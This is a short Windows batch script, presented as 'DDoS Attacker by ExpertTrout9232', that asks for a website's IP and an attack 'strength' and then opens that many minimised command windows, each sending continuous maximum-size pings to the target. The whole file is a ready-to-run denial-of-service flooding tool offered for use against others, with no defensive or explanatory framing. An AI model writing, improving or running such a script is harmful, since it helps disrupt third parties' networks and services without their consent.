@echo off
title DDoS
color 4
echo Welcome to DDoS Attacker by ExpertTrout9232
set /p ip=Enter the IP of the website you want to attack: 
set /p strength=Enter the strength of the attack: 
echo Last chance to exit...
timeout /t 3 /nobreak > nul
set a=0
:loop
start /min cmd /k ping %ip% /t /l 65500
set /a a+=1
if %a% == %strength% goto next
goto loop
:next
pause
exit